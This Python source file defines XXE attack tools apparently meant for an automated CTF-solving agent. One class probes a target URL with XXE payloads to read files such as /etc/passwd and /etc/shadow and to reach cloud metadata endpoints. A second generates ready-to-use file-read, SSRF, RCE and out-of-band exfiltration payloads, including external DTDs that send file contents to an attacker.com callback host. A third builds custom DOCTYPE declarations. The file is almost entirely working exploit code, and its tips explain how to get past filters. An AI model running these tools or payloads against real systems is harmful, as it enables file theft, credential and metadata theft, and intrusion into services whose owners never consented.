"""
XXE (XML External Entity) detection and exploitation tools for CTF solving.

Provides utilities for detecting and exploiting XXE injection vulnerabilities.
"""

import json
import re
import base64
from typing import Dict, List, Optional, Tuple
import requests
from urllib.parse import urlparse


class XxeProbeTool:
    """
    XxeProbeTool: detect XML External Entity (XXE) injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/api/xml",
          "method": "POST",                   # usually POST for XML
          "xml_param": "data",                # optional: parameter containing XML
          "content_type": "application/xml",  # optional: Content-Type header
          "headers": {"Cookie": "..."},       # optional headers
          "timeout": 10,                      # optional timeout in seconds
          "probe_type": "file_read",          # optional: file_read, ssrf, oob, all
          "target_file": "/etc/passwd",       # optional: file to read
          "callback_host": "attacker.com"     # optional: for OOB testing
        }

    The tool injects various XXE payloads and analyzes responses to detect
    XXE vulnerabilities.
    """

    name: str = "xxe_probe"
    description: str = (
        "Detect XML External Entity (XXE) injection vulnerabilities. Input must be JSON "
        "with 'url' and optional 'method' (default POST), 'xml_param' (parameter containing XML), "
        "'content_type', 'headers', 'probe_type' (file_read/ssrf/oob/all), 'target_file' "
        "(default /etc/passwd), and 'callback_host' (for OOB testing). The tool injects "
        "XXE payloads and detects successful exploitation or error-based information disclosure."
    )

    # Common files to attempt reading via XXE
    COMMON_FILES = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/shadow",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/flag.txt",
        "/flag",
        "/home/flag.txt",
        "/root/flag.txt",
        "/app/flag.txt",
    ]

    # File read payloads (classic XXE)
    FILE_READ_PAYLOADS = [
        # Basic external entity
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]>'
            "<root>&xxe;</root>",
            "Basic SYSTEM entity",
        ),
        # With encoding specification
        (
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]>'
            "<root>&xxe;</root>",
            "UTF-8 encoded",
        ),
        # PHP filter wrapper (for PHP applications)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file}">]>'
            "<root>&xxe;</root>",
            "PHP filter base64",
        ),
        # Using PUBLIC identifier
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0//EN" "file://{file}">]>'
            "<root>&xxe;</root>",
            "PUBLIC identifier",
        ),
        # Parameter entity (for bypasses)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://{file}">%xxe;]>'
            "<root>test</root>",
            "Parameter entity",
        ),
        # Nested entity
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{file}">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>'
            "<root>test</root>",
            "Nested/Error-based",
        ),
        # CDATA extraction (bypasses XML parsing issues)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA[">'
            '<!ENTITY % file SYSTEM "file://{file}"><!ENTITY % end "]]>">'
            '<!ENTITY % dtd "<!ENTITY xxe \'%start;%file;%end;\'>">%dtd;]>'
            "<root>&xxe;</root>",
            "CDATA extraction",
        ),
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        # HTTP internal
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:{port}/">]>'
            "<root>&xxe;</root>",
            "Localhost HTTP",
        ),
        # AWS metadata
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
            "<root>&xxe;</root>",
            "AWS metadata",
        ),
        # GCP metadata
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>'
            "<root>&xxe;</root>",
            "GCP metadata",
        ),
        # Azure metadata
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>'
            "<root>&xxe;</root>",
            "Azure metadata",
        ),
        # Internal services
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>'
            "<root>&xxe;</root>",
            "Internal port 8080",
        ),
        # FTP (sometimes allowed when HTTP blocked)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://127.0.0.1/">]>'
            "<root>&xxe;</root>",
            "FTP internal",
        ),
        # HTTPS (with certificate bypass)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://127.0.0.1/">]>'
            "<root>&xxe;</root>",
            "HTTPS internal",
        ),
    ]

    # OOB (Out-of-Band) payloads for blind XXE
    OOB_PAYLOADS = [
        # Basic OOB exfiltration
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe-test">%xxe;]>'
            "<root>test</root>",
            "Basic OOB callback",
        ),
        # OOB with file content
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{file}">'
            '<!ENTITY % xxe SYSTEM "http://{callback}/?data=%file;">%xxe;]>'
            "<root>test</root>",
            "OOB file exfil",
        ),
        # External DTD method
        (
            '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://{callback}/evil.dtd">'
            "<root>test</root>",
            "External DTD",
        ),
        # Parameter entity OOB
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe?data=1">%xxe;]>'
            "<root>test</root>",
            "Parameter entity OOB",
        ),
        # DNS exfiltration
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe-test.{callback}/">%xxe;]>'
            "<root>test</root>",
            "DNS exfil",
        ),
    ]

    # Error-based payloads (trigger verbose errors)
    ERROR_PAYLOADS = [
        # Trigger file not found error with partial content
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{file}">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>'
            "<root>test</root>",
            "Error-based extraction",
        ),
        # Malformed entity
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]>'
            "<root><item>&xxe;</item></root>",
            "Entity in element",
        ),
    ]

    # Success indicators for file read
    FILE_INDICATORS = {
        "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh", "daemon:", "www-data:"],
        "/etc/hosts": ["127.0.0.1", "localhost", "::1"],
        "/etc/shadow": ["root:", "$6$", "$y$", "$1$", "$5$"],
        "/proc/self/environ": ["PATH=", "HOME=", "USER="],
        "C:\\Windows\\win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
        "flag": ["flag{", "FLAG{", "CTF{", "ctf{", "picoCTF{", "HTB{"],
    }

    # Error indicators that suggest XXE might be possible
    XXE_ERROR_INDICATORS = [
        "external entity",
        "entity reference",
        "DOCTYPE",
        "DTD",
        "XML parsing",
        "xml parser",
        "libxml",
        "SAXParser",
        "DocumentBuilder",
        "XMLReader",
        "SimpleXML",
        "DOMDocument",
        "ENTITY",
        "SYSTEM",
        "file://",
        "No such file",
        "failed to open",
        "Permission denied",
        "not allowed",
        "parser error",
        "undefined entity",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XxeProbeTool] Error: tool_input must be JSON. Decoding failed with: {exc}"

        url = data.get("url", "").strip()
        method = data.get("method", "POST").upper()
        xml_param = data.get("xml_param", None)
        content_type = data.get("content_type", "application/xml")
        headers = data.get("headers", {})
        timeout = data.get("timeout", 10)
        probe_type = data.get("probe_type", "all").lower()
        target_file = data.get("target_file", "/etc/passwd")
        callback_host = data.get("callback_host", "attacker.com")

        if not url:
            return "[XxeProbeTool] Error: 'url' is required."
        if probe_type not in ["file_read", "ssrf", "oob", "error", "all"]:
            return f"[XxeProbeTool] Error: 'probe_type' must be file_read, ssrf, oob, error, or all. Got '{probe_type}'."

        try:
            return self._probe_xxe(
                url, method, xml_param, content_type, headers, timeout,
                probe_type, target_file, callback_host
            )
        except requests.RequestException as e:
            return f"[XxeProbeTool] Request error: {e}"
        except Exception as e:
            return f"[XxeProbeTool] Error: {e}"

    def _make_request(
        self,
        url: str,
        method: str,
        payload: str,
        xml_param: Optional[str],
        content_type: str,
        headers: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with XXE payload."""
        request_headers = {"Content-Type": content_type, **headers}

        if xml_param:
            # XML is in a form parameter
            if method == "GET":
                return self.session.get(
                    url, params={xml_param: payload}, headers=request_headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data={xml_param: payload}, headers=request_headers, timeout=timeout
                )
        else:
            # XML is the request body
            if method == "GET":
                return self.session.get(url, headers=request_headers, timeout=timeout)
            else:
                return self.session.post(
                    url, data=payload, headers=request_headers, timeout=timeout
                )

    def _check_file_content(self, response_text: str, target_file: str) -> Tuple[bool, str]:
        """Check if response contains file content indicators."""
        # Check known file indicators
        for file_pattern, indicators in self.FILE_INDICATORS.items():
            if file_pattern in target_file or target_file in file_pattern:
                for indicator in indicators:
                    if indicator in response_text:
                        return True, f"Found '{indicator}'"

        # Check for flag patterns in general
        for indicator in self.FILE_INDICATORS["flag"]:
            if indicator in response_text:
                return True, f"Possible flag found: '{indicator}'"

        # Check for base64 encoded content (from PHP filter)
        base64_pattern = re.search(r"[A-Za-z0-9+/]{50,}={0,2}", response_text)
        if base64_pattern:
            try:
                decoded = base64.b64decode(base64_pattern.group()).decode("utf-8", errors="ignore")
                if "root:" in decoded or "flag" in decoded.lower():
                    return True, f"Base64 decoded content found"
            except Exception:
                pass

        return False, ""

    def _check_xxe_errors(self, response_text: str) -> Tuple[bool, List[str]]:
        """Check for XXE-related error messages."""
        found_indicators = []
        for indicator in self.XXE_ERROR_INDICATORS:
            if indicator.lower() in response_text.lower():
                found_indicators.append(indicator)
        return len(found_indicators) > 0, found_indicators

    def _probe_xxe(
        self,
        url: str,
        method: str,
        xml_param: Optional[str],
        content_type: str,
        headers: dict,
        timeout: int,
        probe_type: str,
        target_file: str,
        callback_host: str,
    ) -> str:
        """Probe for XXE vulnerabilities."""
        results = []
        vulnerable = False
        successful_payloads = []

        results.append("[XxeProbeTool] XXE Vulnerability Scan")
        results.append("=" * 50)
        results.append(f"URL: {url}")
        results.append(f"Method: {method}")
        results.append(f"Content-Type: {content_type}")
        if xml_param:
            results.append(f"XML Parameter: {xml_param}")
        results.append(f"Target File: {target_file}")
        results.append(f"Probe Type: {probe_type}")
        results.append("")

        # Get baseline response
        try:
            baseline_xml = '<?xml version="1.0"?><root>test</root>'
            baseline = self._make_request(
                url, method, baseline_xml, xml_param, content_type, headers, timeout
            )
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
            results.append(f"Baseline response: {baseline_status}, {baseline_len} bytes")
        except Exception as e:
            results.append(f"[!] Could not get baseline response: {e}")
            baseline_len = 0
            baseline_status = 0

        results.append("")

        # Test file read payloads
        if probe_type in ["file_read", "all"]:
            results.append("=== File Read Payloads ===")
            for payload_template, desc in self.FILE_READ_PAYLOADS:
                payload = payload_template.replace("{file}", target_file)
                try:
                    resp = self._make_request(
                        url, method, payload, xml_param, content_type, headers, timeout
                    )

                    # Check for file content
                    found, indicator = self._check_file_content(resp.text, target_file)
                    if found:
                        vulnerable = True
                        successful_payloads.append((payload, desc))
                        results.append(f"[+] VULNERABLE ({desc}): {indicator}")
                        # Include snippet of response
                        snippet = resp.text[:200].replace("\n", " ")
                        results.append(f"    Response snippet: {snippet}...")
                    else:
                        # Check for error-based info disclosure
                        has_errors, errors = self._check_xxe_errors(resp.text)
                        if has_errors:
                            results.append(f"[?] Possible ({desc}): Errors found - {', '.join(errors[:3])}")

                except Exception as e:
                    results.append(f"[!] Error ({desc}): {e}")

            # Try additional common files
            if not vulnerable:
                results.append("\n--- Trying common files ---")
                for common_file in self.COMMON_FILES[:5]:  # Limit to first 5
                    if common_file == target_file:
                        continue
                    payload = self.FILE_READ_PAYLOADS[0][0].replace("{file}", common_file)
                    try:
                        resp = self._make_request(
                            url, method, payload, xml_param, content_type, headers, timeout
                        )
                        found, indicator = self._check_file_content(resp.text, common_file)
                        if found:
                            vulnerable = True
                            results.append(f"[+] VULNERABLE: Read {common_file} - {indicator}")
                            break
                    except Exception:
                        pass

            results.append("")

        # Test SSRF payloads
        if probe_type in ["ssrf", "all"]:
            results.append("=== SSRF Payloads ===")
            for payload_template, desc in self.SSRF_PAYLOADS:
                payload = payload_template.replace("{port}", "80")
                try:
                    resp = self._make_request(
                        url, method, payload, xml_param, content_type, headers, timeout
                    )

                    # Check for metadata or internal response indicators
                    ssrf_indicators = [
                        "ami-id", "instance-id", "meta-data",  # AWS
                        "computeMetadata", "project-id",  # GCP
                        "vmId", "subscriptionId",  # Azure
                        "localhost", "127.0.0.1", "internal",
                    ]
                    for indicator in ssrf_indicators:
                        if indicator.lower() in resp.text.lower():
                            vulnerable = True
                            results.append(f"[+] SSRF ({desc}): Found '{indicator}'")
                            break
                    else:
                        # Check if response differs significantly
                        if abs(len(resp.text) - baseline_len) > 100:
                            results.append(f"[?] Possible SSRF ({desc}): Response size changed ({len(resp.text)} vs {baseline_len})")

                except Exception as e:
                    # Timeouts might indicate SSRF is working
                    if "timeout" in str(e).lower():
                        results.append(f"[?] Possible SSRF ({desc}): Request timed out (might be connecting)")

            results.append("")

        # Test OOB payloads
        if probe_type in ["oob", "all"]:
            results.append("=== Out-of-Band (OOB) Payloads ===")
            results.append(f"[*] Using callback host: {callback_host}")
            results.append("[*] Note: Monitor your callback server for incoming requests")
            results.append("")
            for payload_template, desc in self.OOB_PAYLOADS:
                payload = payload_template.replace("{callback}", callback_host).replace("{file}", target_file)
                results.append(f"[>] {desc}:")
                results.append(f"    {payload[:100]}...")
            results.append("")
            results.append("[*] To test blind XXE, use a callback server like:")
            results.append("    - Burp Collaborator")
            results.append("    - interactsh (https://app.interactsh.com)")
            results.append("    - RequestBin")
            results.append("    - Your own server with: nc -lvp 80")
            results.append("")

        # Test error-based payloads
        if probe_type in ["error", "all"]:
            results.append("=== Error-Based Detection ===")
            for payload_template, desc in self.ERROR_PAYLOADS:
                payload = payload_template.replace("{file}", target_file)
                try:
                    resp = self._make_request(
                        url, method, payload, xml_param, content_type, headers, timeout
                    )
                    has_errors, errors = self._check_xxe_errors(resp.text)
                    if has_errors:
                        results.append(f"[?] Error disclosure ({desc}): {', '.join(errors[:3])}")

                        # Check if file content leaks in error
                        found, indicator = self._check_file_content(resp.text, target_file)
                        if found:
                            vulnerable = True
                            results.append(f"[+] VULNERABLE: File content in error - {indicator}")

                except Exception as e:
                    results.append(f"[!] Error ({desc}): {e}")

            results.append("")

        # Summary
        results.append("=== Summary ===")
        if vulnerable:
            results.append("[!] XXE VULNERABILITY DETECTED!")
            if successful_payloads:
                results.append("\n[*] Working payloads:")
                for payload, desc in successful_payloads[:3]:
                    results.append(f"    - {desc}")
        else:
            results.append("[-] No direct XXE exploitation confirmed")
            results.append("[*] Consider:")
            results.append("    1. Testing with OOB/blind XXE techniques")
            results.append("    2. Different file paths")
            results.append("    3. Different XML structures matching app's expected format")
            results.append("    4. URL-encoded payloads")

        return "\n".join(results)


class XxePayloadGenerator:
    """
    XxePayloadGenerator: generate XXE payloads for specific scenarios.

    This tool generates customized XXE payloads for various exploitation
    scenarios once a vulnerability has been identified.
    """

    name: str = "xxe_payload_generator"
    description: str = (
        "Generate XXE payloads for specific scenarios. Input must be JSON with "
        "'payload_type' (file_read/ssrf/oob/rce), 'target' (file path or URL), and "
        "optional 'callback' (for OOB), 'root_element' (wrapper element name), "
        "'wrapper' (full XML structure with {payload} placeholder). Returns ready-to-use "
        "XXE payloads."
    )

    # Payload templates
    PAYLOAD_TEMPLATES = {
        "file_read": {
            "basic": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target}">]><{root}>&xxe;</{root}>',
            "php_base64": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target}">]><{root}>&xxe;</{root}>',
            "cdata": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file://{target}"><!ENTITY % end "]]>"><!ENTITY % dtd "<!ENTITY xxe \'%start;%file;%end;\'>">%dtd;]><{root}>&xxe;</{root}>',
            "param_entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://{target}">%xxe;]><{root}>test</{root}>',
            "netdoc": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://{target}">]><{root}>&xxe;</{root}>',
        },
        "ssrf": {
            "http": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{target}">]><{root}>&xxe;</{root}>',
            "https": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://{target}">]><{root}>&xxe;</{root}>',
            "ftp": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://{target}">]><{root}>&xxe;</{root}>',
            "gopher": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://{target}">]><{root}>&xxe;</{root}>',
            "jar": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://{target}!/file.txt">]><{root}>&xxe;</{root}>',
        },
        "oob": {
            "external_dtd": '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://{callback}/evil.dtd"><{root}>test</{root}>',
            "param_oob": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe">%xxe;]><{root}>test</{root}>',
            "exfil_base64": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target}"><!ENTITY % dtd SYSTEM "http://{callback}/exfil.dtd">%dtd;]><{root}>test</{root}>',
            "dns_exfil": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe.{callback}/">%xxe;]><{root}>test</{root}>',
        },
        "rce": {
            "expect": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://{target}">]><{root}>&xxe;</{root}>',
            "php_data": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,{target}">]><{root}>&xxe;</{root}>',
        },
    }

    # External DTD templates for OOB exfiltration
    EXTERNAL_DTD_TEMPLATES = {
        "basic_exfil": '''<!ENTITY % file SYSTEM "file://{target}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback}/?data=%file;'>">
%eval;
%exfil;''',
        "base64_exfil": '''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback}/?data=%file;'>">
%eval;
%exfil;''',
        "ftp_exfil": '''<!ENTITY % file SYSTEM "file://{target}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{callback}/%file;'>">
%eval;
%exfil;''',
    }

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XxePayloadGenerator] Error: tool_input must be JSON: {exc}"

        payload_type = data.get("payload_type", "").lower()
        target = data.get("target", "/etc/passwd")
        callback = data.get("callback", "attacker.com")
        root_element = data.get("root_element", "root")
        wrapper = data.get("wrapper", None)  # Custom XML wrapper

        if not payload_type:
            types = ", ".join(self.PAYLOAD_TEMPLATES.keys())
            return f"[XxePayloadGenerator] Error: 'payload_type' is required. Options: {types}"

        if payload_type not in self.PAYLOAD_TEMPLATES:
            types = ", ".join(self.PAYLOAD_TEMPLATES.keys())
            return (
                f"[XxePayloadGenerator] Error: Unknown payload_type '{payload_type}'. "
                f"Options: {types}"
            )

        result = [f"[XxePayloadGenerator] Payloads for {payload_type.upper()}"]
        result.append("=" * 50)
        result.append(f"Target: {target}")
        if payload_type == "oob":
            result.append(f"Callback: {callback}")
        result.append(f"Root Element: {root_element}")
        result.append("")

        templates = self.PAYLOAD_TEMPLATES[payload_type]
        result.append("=== Payloads ===")
        for name, template in templates.items():
            formatted = template.replace("{target}", target)
            formatted = formatted.replace("{callback}", callback)
            formatted = formatted.replace("{root}", root_element)

            # Apply custom wrapper if provided
            if wrapper and "{payload}" in wrapper:
                # Extract the entity definition
                entity_part = formatted.split("]>")[0] + "]>"
                entity_ref = "&xxe;" if "&xxe;" in formatted else ""
                formatted = wrapper.replace("{payload}", entity_part + entity_ref)

            result.append(f"\n--- {name} ---")
            result.append(formatted)

        # Add external DTD templates for OOB
        if payload_type == "oob":
            result.append("")
            result.append("=== External DTD Files ===")
            result.append("[*] Host these on your callback server")
            for name, dtd in self.EXTERNAL_DTD_TEMPLATES.items():
                formatted = dtd.replace("{target}", target)
                formatted = formatted.replace("{callback}", callback)
                result.append(f"\n--- {name} (evil.dtd) ---")
                result.append(formatted)

        # Add tips
        result.append("")
        result.append("=== Tips ===")
        if payload_type == "file_read":
            result.append("1. If direct read fails, try base64 encoding (PHP) to handle special chars")
            result.append("2. Try different file paths: /flag.txt, /home/user/flag, /var/www/html/flag.php")
            result.append("3. For Windows: C:\\flag.txt, C:\\Users\\Administrator\\flag.txt")
            result.append("4. netdoc:// might work when file:// is blocked (Java)")
        elif payload_type == "ssrf":
            result.append("1. Try internal ports: 80, 8080, 443, 8443, 3000, 5000")
            result.append("2. Test cloud metadata endpoints (169.254.169.254)")
            result.append("3. Use IP encoding bypasses: 127.0.0.1 -> 2130706433, 0x7f000001")
            result.append("4. gopher:// can be used for more complex protocols")
        elif payload_type == "oob":
            result.append("1. Use interactsh.com or Burp Collaborator for testing")
            result.append("2. Check DNS logs if HTTP fails (might be blocked)")
            result.append("3. FTP exfiltration works for multi-line files")
            result.append("4. Base64 encode to handle special characters")
        elif payload_type == "rce":
            result.append("1. expect:// requires PHP expect extension (rare)")
            result.append("2. data:// requires allow_url_include=On in PHP")
            result.append("3. Consider SSRF to internal services for RCE")

        return "\n".join(result)


class XxeDocTypeBuilder:
    """
    XxeDocTypeBuilder: build custom DOCTYPE declarations for XXE.

    Helps construct complex DOCTYPE declarations for advanced XXE scenarios.
    """

    name: str = "xxe_doctype_builder"
    description: str = (
        "Build custom DOCTYPE declarations for XXE attacks. Input must be JSON with "
        "'entities' (list of entity definitions), optional 'root' (root element name), "
        "and 'content' (body content). Useful for constructing complex multi-entity XXE payloads."
    )

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XxeDocTypeBuilder] Error: tool_input must be JSON: {exc}"

        entities = data.get("entities", [])
        root = data.get("root", "root")
        content = data.get("content", "&xxe;")

        if not entities:
            return self._show_examples()

        result = ['<?xml version="1.0"?>']
        result.append(f"<!DOCTYPE {root} [")

        for entity in entities:
            if isinstance(entity, dict):
                name = entity.get("name", "xxe")
                value = entity.get("value", "")
                entity_type = entity.get("type", "general")  # general, parameter, system
                system = entity.get("system", False)

                if entity_type == "parameter":
                    if system:
                        result.append(f'  <!ENTITY % {name} SYSTEM "{value}">')
                    else:
                        result.append(f'  <!ENTITY % {name} "{value}">')
                else:
                    if system:
                        result.append(f'  <!ENTITY {name} SYSTEM "{value}">')
                    else:
                        result.append(f'  <!ENTITY {name} "{value}">')
            elif isinstance(entity, str):
                # Raw entity definition
                result.append(f"  {entity}")

        result.append("]>")
        result.append(f"<{root}>{content}</{root}>")

        output = [
            "[XxeDocTypeBuilder] Generated XXE Payload",
            "=" * 50,
            "",
            "\n".join(result),
        ]

        return "\n".join(output)

    def _show_examples(self) -> str:
        examples = [
            "[XxeDocTypeBuilder] Usage Examples",
            "=" * 50,
            "",
            "=== Basic File Read ===",
            json.dumps({
                "entities": [
                    {"name": "xxe", "value": "file:///etc/passwd", "system": True}
                ],
                "root": "data",
                "content": "&xxe;"
            }, indent=2),
            "",
            "=== Parameter Entity OOB ===",
            json.dumps({
                "entities": [
                    {"name": "file", "value": "file:///etc/passwd", "type": "parameter", "system": True},
                    {"name": "exfil", "value": "http://attacker.com/?d=%file;", "type": "parameter", "system": True},
                    "%exfil;"
                ],
                "root": "data",
                "content": "test"
            }, indent=2),
            "",
            "=== Chained Entities ===",
            json.dumps({
                "entities": [
                    {"name": "a", "value": "file:///etc/passwd", "system": True},
                    {"name": "b", "value": "&a;&a;"},
                ],
                "root": "data",
                "content": "&b;"
            }, indent=2),
        ]
        return "\n".join(examples)
